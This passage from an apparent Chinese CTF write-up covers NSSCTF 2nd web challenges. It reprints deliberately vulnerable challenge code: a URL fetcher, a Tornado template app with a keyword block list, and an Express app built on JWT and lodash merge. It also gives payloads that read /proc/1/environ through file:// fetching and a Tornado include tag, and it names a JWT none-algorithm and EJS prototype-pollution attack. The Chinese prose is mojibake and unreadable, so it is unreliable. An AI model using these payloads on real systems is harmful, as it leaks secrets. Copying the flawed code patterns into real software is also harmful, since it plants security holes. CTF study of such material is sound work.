    <span class="token keyword">elif</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'http://localhost/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token keyword">elif</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'mybox://127.0.0.1:'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        port<span class="token punctuation">,</span> content <span class="token operator">=</span> url<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/_'</span><span class="token punctuation">,</span> maxsplit<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> data<span class="token punctuation">:</span>
                res <span class="token operator">+=</span> data
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">return</span> res
    <span class="token keyword">return</span> <span class="token string">''</span>

app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">827</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸çœ‹ä¸Šé¢ä»£ç çš„æƒ…å†µä¸‹è¿™é¢˜è¿˜æœ‰ä¸€ä¸ªéé¢„æœŸè§£å°±æ˜¯ç›´æ¥è¯»å–ç¯å¢ƒå˜é‡<br><code>view-source:http://node5.anna.nssctf.cn:28756/?url=file:///proc/1/environ</code><br><img src="https://img-blog.csdnimg.cn/67f10ba64ae2427f86015bf9692890c1.png" alt="3"></p>
<h3 id="NSSCTF-2nd-MyHurricane"><a href="#NSSCTF-2nd-MyHurricane" class="headerlink" title="[NSSCTF 2nd]MyHurricane"></a>[NSSCTF 2nd]MyHurricane</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>ioloop
<span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web
<span class="token keyword">import</span> os

BASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    bl <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'not'</span><span class="token punctuation">,</span> <span class="token string">'&#123;&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;&#125;'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> bl<span class="token punctuation">:</span>
        <span class="token keyword">if</span> c <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">for</span> chunk <span class="token keyword">in</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> chunk<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">31</span> <span class="token operator">&lt;</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">class</span> <span class="token class-name">IndexHandler</span><span class="token punctuation">(</span>tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">"ssti"</span><span class="token punctuation">)</span><span class="token comment">#POSTä¼ å…¥ssti</span>
        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.html'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"""&lt;html>
                        &lt;head>&lt;/head>
                        &lt;body style="font-size: 30px;"></span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/body>&lt;/html>
                        """</span></span><span class="token punctuation">)</span>
                f<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'1.html'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span><span class="token string">'no no no'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app <span class="token operator">=</span> tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>Application<span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token punctuation">(</span><span class="token string">r"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span> compiled_template_cache<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    app<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">827</span><span class="token punctuation">)</span>
    tornado<span class="token punctuation">.</span>ioloop<span class="token punctuation">.</span>IOLoop<span class="token punctuation">.</span>current<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çœ‹å‡ºæ˜¯<strong>tornado</strong>æ¨¡æ¿æ³¨å…¥<br>éé¢„æœŸè¯»å–ç¯å¢ƒå˜é‡<code>&#123;% include /proc/1/environ %&#125;</code>.<br><img src="https://img-blog.csdnimg.cn/a093653f8c384dafaf5510233312477b.png" alt="4"></p>
<h3 id="NSSCTF-2nd-MyJs"><a href="#NSSCTF-2nd-MyJs" class="headerlink" title="[NSSCTF 2nd]MyJs"></a>[NSSCTF 2nd]MyJs</h3><blockquote>
<p>è€ƒç‚¹ï¼šjwtç©ºç®—æ³•æ”»å‡»+ejsåŸå‹é“¾æ±¡æŸ“</p>
</blockquote>
<p>è¿™é¢˜å¤ç°æäº†åŠå¤©ã€‚ã€‚ã€‚</p>
<p>æ‰“å¼€ç½‘ç«™ï¼ŒæŸ¥çœ‹æºä»£ç <code>/source</code>ã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> lodash <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> randomize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'randomatic'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> <span class="token string">'./views'</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'session'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token function">randomize</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>__filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> token<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
        <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>sid <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login error.'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                <span class="token literal-property property">username</span><span class="token operator">:</span> username<span class="token punctuation">,</span>
                <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span>
            res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login error.'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Username existed."</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Token: "</span> <span class="token operator">+</span> token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/update'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">827</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

